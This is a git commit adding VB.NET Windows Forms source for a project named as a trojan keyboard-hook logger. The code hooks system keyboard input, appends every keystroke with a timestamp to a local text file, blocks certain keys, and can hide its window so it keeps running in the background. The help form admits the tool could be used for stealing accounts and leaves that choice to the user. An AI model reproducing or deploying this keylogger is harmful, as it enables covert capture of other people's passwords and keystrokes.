df4ff412e666993fe9512232313d667fd8712654
Bigbutt <313947568@qq.com>
2019-08-07 19:46:51 +0800

    添加项目文件。

---
+++ 木马钩子记录键盘/Form1.vb
@@ -0,0 +1,40 @@
+﻿Imports 木马钩子记录键盘.SystemHook
+Imports System.Windows.Forms
+Imports System.IO
+Public Class Form1
+    Dim WithEvents hook As New SystemHook
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        hook.StartHook(True, True) '启用键盘与鼠标钩子
+        Button1.Enabled = False
+    End Sub
+
+    Private Sub Form1_Closed(sender As Object, e As EventArgs) Handles Me.Closed
+        Dim hook As New SystemHook
+        hook.UnHook()
+    End Sub
+
+    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
+        Me.Hide()
+    End Sub
+    Private Sub hook_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles hook.KeyDown
+        Me.Text = e.KeyCode.ToString
+        Label2.Text = e.KeyCode.ToString
+        Dim file As StreamWriter
+        file = New StreamWriter("notebook.txt", True)
+        file.WriteLine(e.KeyCode.ToString & "  " & Now())
+        file.Close()
+        Select Case e.KeyCode
+            Case Keys.F1, Keys.LWin '禁用F1键与左边的Win键
+                Beep()
+                e.Handled = True '禁止调用下一个钩子，等于屏蔽这个按键
+        End Select
+    End Sub
+
+    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
+        Dim nf As New Form2
+        nf.Show()
+    End Sub
+    'Private Sub hook_MouseActivity(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles hook.MouseActivity
+    'Me.Text = e.Location.ToString
+    'End Sub
+End Class
---
+++ 木马钩子记录键盘/Form2.Designer.vb
@@ -0,0 +1,83 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form2
+    Inherits System.Windows.Forms.Form
+
+    'Form 重写 Dispose，以清理组件列表。
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Windows 窗体设计器所必需的
+    Private components As System.ComponentModel.IContainer
+
+    '注意: 以下过程是 Windows 窗体设计器所必需的
+    '可以使用 Windows 窗体设计器修改它。  
+    '不要使用代码编辑器修改它。
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.Label3 = New System.Windows.Forms.Label()
+        Me.SuspendLayout()
+        '
+        'Label1
+        '
+        Me.Label1.Font = New System.Drawing.Font("宋体", 10.5!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(134, Byte))
+        Me.Label1.Location = New System.Drawing.Point(0, 2)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(394, 48)
+        Me.Label1.TabIndex = 0
+        Me.Label1.Text = "    按下按钮开始即可开始监控电脑键盘，同时按下任意键盘即可在exe当前目录下生成一个文本文档，里面记录了你需要的按键记录"
+        '
+        'Label2
+        '
+        Me.Label2.ForeColor = System.Drawing.Color.Red
+        Me.Label2.Location = New System.Drawing.Point(126, 137)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(259, 56)
+        Me.Label2.TabIndex = 1
+        Me.Label2.Text = "WARNING!!   不能用于非法盗号目的，如果你偏要，那我也没办法，后果自负就行了"
+        '
+        'Label3
+        '
+        Me.Label3.Font = New System.Drawing.Font("宋体", 10.5!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(134, Byte))
+        Me.Label3.Location = New System.Drawing.Point(0, 50)
+        Me.Label3.Name = "Label3"
+        Me.Label3.Size = New System.Drawing.Size(394, 37)
+        Me.Label3.TabIndex = 2
+        Me.Label3.Text = "    按钮隐藏即可隐藏窗体，如需关闭后台，即可通过任务管理器关闭"
+        '
+        'Form2
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 12.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(397, 214)
+        Me.Controls.Add(Me.Label3)
+        Me.Controls.Add(Me.Label2)
+        Me.Controls.Add(Me.Label1)
+        Me.MaximizeBox = False
+        Me.MaximumSize = New System.Drawing.Size(413, 252)
+        Me.MinimizeBox = False
+        Me.MinimumSize = New System.Drawing.Size(413, 252)
+        Me.Name = "Form2"
+        Me.Opacity = 0.7R
+        Me.ShowIcon = False
+        Me.ShowInTaskbar = False
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "HELP"
+        Me.TopMost = True
+        Me.ResumeLayout(False)
+
+    End Sub
+
+    Friend WithEvents Label1 As Windows.Forms.Label
+    Friend WithEvents Label2 As Windows.Forms.Label
+    Friend WithEvents Label3 As Windows.Forms.Label
+End Class
